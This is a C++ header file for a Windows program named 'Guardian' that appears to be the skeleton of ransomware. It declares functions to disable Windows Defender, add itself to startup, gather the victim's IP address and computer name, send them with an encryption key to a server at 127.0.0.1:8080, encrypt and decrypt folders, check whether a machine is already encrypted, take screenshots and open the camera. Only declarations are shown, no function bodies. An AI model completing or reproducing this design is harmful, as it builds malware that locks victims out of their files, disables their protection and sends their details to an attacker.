#pragma once

#include <string>
#include <windows.h>
#include <shlobj.h>
#include <atlbase.h>
#include <atlsecurity.h>
#include <shobjidl.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <wininet.h>
#include <winsock.h>
#include <filesystem>
#include <fstream>

class __userDetils__
{
public:
    std::string UserIP;
    std::string ComputerName;
    uint16_t key;

    __userDetils__() : UserIP(""), ComputerName(""), key(0) {}
    __userDetils__(std::string user_ip, std::string computer_name, uint16_t k) 
        : UserIP(user_ip), ComputerName(computer_name), key(k) {}
};

// Constants
#define BIG_SIZE 4024
#define MAX_BUFFER_SIZE 1024
#define APP_NAME "Guardian"
#define MAX_RANDOM_NUMBER 126
#define MIN_RANDOM_NUMBER 33
#define SERVER_ADDRESS "127.0.0.1"
#define SERVER_PORT 8080 // default port for HTTP server

// Function declarations
bool IsAdministrator(HRESULT& rHr);
bool add_to_startup(const std::string& exe_path);
std::string get_this_file_path();
bool open_camera_app();
bool disable_defender();
std::string get_file_folder(std::string file_path);
int get_encryption_key();
bool send_data_to_server(SOCKET clientSocket, int key, __userDetils__ userDetails);
std::string fetch_ip_address();
std::string fetch_computer_name();
SOCKET connect_to_server();
std::string conccet_ip_and_computer_name(size_t public_key, __userDetils__* userDetils);
bool EN_DEcrypt_file_folders(int key, std::string folder_path);
bool check_for_exe_file(std::string file_name);
bool get_file_folders(int key, std::string folder_path, std::string start, int mode);
bool find_folder(std::string file_name);
bool takeScreenShot();
void printStructure(__userDetils__ userDetils);
void saveStrucetInFile(__userDetils__ user_details);
bool createFile(std::string filePath);
bool alreadyEncrypted(SOCKET socket, __userDetils__ userDetils);